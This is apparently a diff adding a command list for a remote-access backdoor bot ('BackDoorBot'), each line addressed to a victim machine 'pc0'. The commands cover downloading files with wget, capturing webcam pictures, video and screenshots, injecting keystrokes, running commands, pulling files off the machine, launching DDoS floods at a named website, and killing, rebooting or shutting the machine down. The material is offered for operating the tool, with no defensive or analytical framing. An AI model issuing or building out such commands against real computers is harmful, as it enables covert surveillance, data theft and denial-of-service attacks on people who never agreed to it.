@@ -1,0 +1,23 @@
+pc0 wget {https://raw.githubusercontent.com/DmodvGH/BackDoorBot/main/requirements.txt} {media/requirements.txt}
+pc0 ip
+pc0 spec
+pc0 pict {pic0}
+pc0 cmdi {mspaint}
+pc0 cmdo {dir}
+pc0 vide {vid0}
+pc0 keyb {Hi I BOT}
+pc0 rask
+pc0 dir {.}
+pc0 scrn
+pc0 inpt {Input text}
+pc0 outp {Hi}
+pc0 start {media/vid0}
+pc0 ddosf {https://www.youtube.com/}
+pc0 ddosw {https://www.youtube.com/}
+pc0 pull {media/pic0}
+pc0 cls
+pc0 close
+pc0 kill
+pc0 reboot
+pc0 shotdown
+pc0 upd
